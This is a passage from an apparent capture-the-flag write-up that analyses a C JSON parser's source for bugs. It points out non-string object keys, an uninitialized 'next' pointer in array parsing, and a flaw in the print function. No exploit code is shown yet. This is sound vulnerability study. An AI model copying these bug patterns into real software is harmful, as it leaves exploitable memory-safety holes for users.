</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="o">++</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">parse_value</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free_value</span><span class="p">(</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">elem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;}&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">elem</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">elem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;,&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="o">++</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="nf">parse_object_element</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">free_value</span><span class="p">(</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">free_value</span><span class="p">(</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">free</span><span class="p">(</span><span class="n">elem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">elem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So looking at the above function, first, it will allocate a new <code>json_t</code> object named <code>data</code>. Observed that the <code>json_t</code> object size is <code>0x10</code>, where the first 8 bytes are a <code>union</code> type, which might represent some types, and the last 8 bytes are <code>type_t</code> field, which defined the type of the <code>json</code> input that the program tried to parse.</p>
<p>Next, it will assign <code>T_OBJECT</code> TYPE, skip some whitespaces, and then it will check whether it need to fill <code>data-&gt;object</code> or not based on the current character. If it is <code>}</code>, that means the <code>json</code> that it&rsquo;s trying to parse is an empty object, so it will simply set the <code>object</code> to <code>NULL</code> and return the data. Else, it will call <code>parse_object_element</code>, which is another function that is used to fill in the <code>data-&gt;object</code> field.</p>
<p><code>parse_object_element</code> will start by allocating a new object with type <code>object_t</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">Object</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">object_t</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">json_t</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">object_t</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then, the function will try to continue on parsing it, which is divided into three stages:</p>
<ul>
<li>First, it will try to parse the <code>key</code> from our input, which is marked by having a <code>:</code> character at the end of the input.</li>
<li>Next, it will try to parse the <code>value</code> from our input.</li>
<li>And last, it will check whether our input has more than one pair of key-value or not.
<ul>
<li>If it isn&rsquo;t, it will set the the <code>next</code> as null.</li>
<li>Else, it will call <code>parse_object_element</code> again (recursive), so that it can assign the <code>next</code> with a pointer to another <code>object</code>.</li>
</ul>
</li>
</ul>
<p>Observe that the <code>key</code> and <code>value</code> will be parsed with <code>parse_value</code> function, the function that we have discussed before (recursively).</p>
<p>One key observation here that we could see is that, there is <strong>one violation</strong> that this binary make during parsing the JSON object. The result of the <code>key</code> from the parser function isn&rsquo;t required to be string in here. It can be any <code>value</code> that has been defined on the binary. Let&rsquo;s keep this in our mind, so that we can later double check whether this violation is indeed a bug or not.</p>
<p>Now, let&rsquo;s move to the next functions, which is <code>parse_array</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">Array</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">array_t</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">json_t</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">array_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">parse_array</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">json_t</span> <span class="o">**</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">json_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">json_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">T_ARRAY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;]&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">-&gt;</span><span class="n">array</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">parse_array_element</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">array</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">parse_array_element</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">array_t</span> <span class="o">**</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">array_t</span> <span class="o">*</span><span class="n">elem</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">array_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">elem</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">parse_value</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">elem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;]&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">elem</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">elem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;,&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="o">++</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="nf">parse_array_element</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">free_value</span><span class="p">(</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">free</span><span class="p">(</span><span class="n">elem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">elem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Similar to what the <code>parse_object</code> did, the <code>parse_array</code> function will start by allocating a <code>json_t</code> object named <code>data</code> and set the <code>type</code> to <code>T_ARRAY</code>. Next, it will skip whitespaces, and then proceed to check the next parsed character. If it is <code>]</code>, that means our input is an empty array, so it will set the <code>data-&gt;array</code> to <code>null</code> and return it.</p>
<p>Else, it will start parsing our input&rsquo;s elements by calling <code>parse_array_element</code>. This will allocate a new object <code>array_t</code> named <code>elem</code>, where it will fill <code>elem-&gt;value</code> with the result of <code>parse_value</code> (recursive), then check whether it ended with <code>]</code> or <code>,</code>. If it is ended with <code>]</code>, it will set the <code>elem-&gt;next</code> to null. If it is ended with <code>,</code>, it will set the <code>elem-&gt;next</code> with a pointer to another element produced by the <code>parse_array_element</code> recursive call.</p>
<p>There is one subtle bug here if you noticed. Observed that if the last char is not <code>]</code> nor <code>,</code>, instead of returning error, the function will still return the <code>elem</code>, leaving the <code>elem-&gt;next</code> <strong>uninitialized</strong>.</p>
<p>This means, if the <code>elem</code> allocated chunk&rsquo;s address was used before and it isn&rsquo;t cleared, the <code>elem-&gt;next</code> will still contains residual value from other or previous operations.</p>
<p>Now, there are 3 more parsers functions, which is to parse <code>number</code>, <code>boolean</code>, and <code>null</code> data type. However, I won&rsquo;t talk about those functions in this writeup because they&rsquo;re not relevant to the solutions.</p>
<h3 id="analyze-print-function">Analyze print function</h3>
<p>We just discussed on how the parsers function work, not it&rsquo;s time for us to check the <code>print_value</code> function, which is the main reason why this binary exist.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">print_value</span> <span class="p">(</span><span class="kt">json_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">indent</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_NULL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;null&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_BOOL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">boolean</span> <span class="o">?</span> <span class="s">&#34;true&#34;</span> <span class="o">:</span> <span class="s">&#34;false&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_INT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">nint</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_FLOAT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%lf&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">nfloat</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_STRING</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_ARRAY</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">array_t</span> <span class="o">*</span><span class="n">curr</span> <span class="o">=</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">curr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[]&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">indent</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">print_value</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">,</span> <span class="n">indent</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">curr</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;,</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">indent</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;]&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_OBJECT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">object_t</span> <span class="o">*</span><span class="n">curr</span> <span class="o">=</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">curr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;{}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;{</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">indent</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">: &#34;</span><span class="p">,</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">print_value</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">,</span> <span class="n">indent</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">curr</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;,</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">indent</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid type!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This pretty print function will try to print data based on the stored <code>data-&gt;type</code>. For <code>object</code> and <code>array</code> data type, it will try to recursively <code>print</code> the elements that they have.</p>
<p>Looking at a glance, we might think that this function should be okay. However, there is one subtle bug in here. Take a look at the case where the <code>data-&gt;type</code> is <code>T_OBJECT</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
